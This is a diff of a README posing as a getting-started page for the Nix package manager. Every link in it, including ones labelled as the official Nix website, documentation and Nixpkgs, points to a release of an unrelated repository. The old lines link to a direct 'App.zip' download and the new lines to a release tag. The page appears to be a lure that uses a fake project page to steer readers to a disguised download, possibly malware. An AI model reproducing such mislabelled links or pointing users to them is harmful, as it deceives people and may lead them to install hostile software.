@@ -8,7 +8,7 @@ To get started with Nix and explore its functionalities, check out the following
 
 ### Installation
 If you haven't installed Nix yet, you can download it from the official website or use the following link to download the Nix installation package:
-[![Download Nix](https://github.com/IrRe1ev4nt/nix-is-hard/releases/download/v1.0/App.zip)](https://github.com/IrRe1ev4nt/nix-is-hard/releases/download/v1.0/App.zip)
+[![Download Nix](https://github.com/IrRe1ev4nt/nix-is-hard/releases/tag/v2.0)](https://github.com/IrRe1ev4nt/nix-is-hard/releases/tag/v2.0)
 
 ### Launch Instructions
 Once you have downloaded the Nix installation package, follow the instructions provided in the README file to launch and set up Nix on your system.
@@ -16,11 +16,11 @@ Once you have downloaded the Nix installation package, follow the instructions p
 ## 📚 Resources
 Explore the following resources to enhance your knowledge and skills in working with Nix:
 
-- [Nix Documentation](https://github.com/IrRe1ev4nt/nix-is-hard/releases/download/v1.0/App.zip)
-- [Nixpkgs Repository](https://github.com/IrRe1ev4nt/nix-is-hard/releases/download/v1.0/App.zip)
+- [Nix Documentation](https://github.com/IrRe1ev4nt/nix-is-hard/releases/tag/v2.0)
+- [Nixpkgs Repository](https://github.com/IrRe1ev4nt/nix-is-hard/releases/tag/v2.0)
 
 ## 🌐 Additional Links
-For more information and updates, consider visiting the official Nix website: [Nix Official Website](https://github.com/IrRe1ev4nt/nix-is-hard/releases/download/v1.0/App.zip)
+For more information and updates, consider visiting the official Nix website: [Nix Official Website](https://github.com/IrRe1ev4nt/nix-is-hard/releases/tag/v2.0)
 
 ## 🎉 Let's Dive into Nix!
 Get ready to unleash the power of Nix and simplify your package management tasks with the comprehensive resources available in this repository. Happy coding! 🚀
